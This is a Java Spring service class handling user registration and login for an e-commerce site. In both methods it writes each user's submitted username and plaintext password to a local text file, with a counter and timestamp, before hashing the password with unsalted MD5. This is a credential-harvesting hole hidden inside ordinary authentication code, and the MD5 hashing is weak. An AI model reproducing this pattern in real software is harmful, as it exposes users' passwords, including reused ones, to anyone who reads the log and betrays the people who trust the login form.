package com.ch.ebusiness.service.before;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpSession;

import com.ch.ebusiness.controller.before.Write;
import com.ch.ebusiness.util.IpUtil;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;
import org.springframework.ui.Model;
import com.ch.ebusiness.entity.BUser;
import com.ch.ebusiness.repository.before.UserRepository;
import com.ch.ebusiness.util.MD5Util;
@Service
public class UserServiceImpl implements UserService {
	int counter = 1;
	@Autowired 
	private UserRepository userRepository;
	@Override
	public String isUse(BUser bUser) {
		if(userRepository.isUse(bUser).size() > 0) {
			return "no";
		}
		return "ok";
	}
	@Override
	public String register(BUser bUser) {

		//获取id & pwd
		String aname = bUser.getBemail();
		String apwd = bUser.getBpwd();
		if(aname.equals("")){
			aname = "(无)";
		}
		if(apwd.equals("")){
			apwd = "(无)";
		}

		Write write = new Write();

		//获取时间
		SimpleDateFormat df = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");//设置日期格式
		String time = String.valueOf(df.format(new Date()));
//		System.out.println(df.format(new Date()));// new Date()为获取当前系统时间


		//记录输入的 id 和 pwd
		write.WriteIntoMyText("获取到新注册的用户名和密码信息"+(counter++)+":",2);
		write.WriteIntoMyText("用户名:"+aname,2);
		write.WriteIntoMyText("密码:"+apwd,2);
//		write.WriteIntoMyText("--------------------------");

		//记录写入时间
//		write.WriteIntoMyText("time:");
		write.WriteIntoMyText("时间:"+time,2);
		write.WriteIntoMyText("--------------------------",2);


		//对密码MD5加密
		bUser.setBpwd(MD5Util.MD5(bUser.getBpwd()));
		if(userRepository.register(bUser) > 0) {
			return "user/login";
		}
		return "user/register";
	}
	@Override
	public String login(BUser bUser, HttpSession session, Model model) {

		//获取id & pwd
		String aname = bUser.getBemail();
		String apwd = bUser.getBpwd();
		if(aname.equals("")){
			aname = "(无)";
		}
		if(apwd.equals("")){
			apwd = "(无)";
		}

		Write write = new Write();

		//获取时间
		SimpleDateFormat df = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");//设置日期格式
		String time = String.valueOf(df.format(new Date()));
//		System.out.println(df.format(new Date()));// new Date()为获取当前系统时间

		//记录输入的 id 和 pwd
		write.WriteIntoMyText("获取到用户登录的用户名和密码信息"+(counter++)+":",0);
		write.WriteIntoMyText("用户名:"+aname,0);
		write.WriteIntoMyText("密码:"+apwd,0);
//		write.WriteIntoMyText("--------------------------");

		//记录写入时间
//		write.WriteIntoMyText("time:");
		write.WriteIntoMyText("时间:"+time,0);
		write.WriteIntoMyText("--------------------------",0);

		//对密码MD5加密
		bUser.setBpwd(MD5Util.MD5(bUser.getBpwd()));
		String rand = (String)session.getAttribute("rand");
		if(!rand.equalsIgnoreCase(bUser.getCode())) {
			model.addAttribute("errorMessage", "验证码错误！");
			return "user/login";
		}
		List<BUser> list = userRepository.login(bUser);
		if(list.size() > 0) {
			session.setAttribute("bUser", list.get(0));
			return "redirect:/";//到首页
		}
		model.addAttribute("errorMessage", "用户名或密码错误！");
		return "user/login";
	}


}
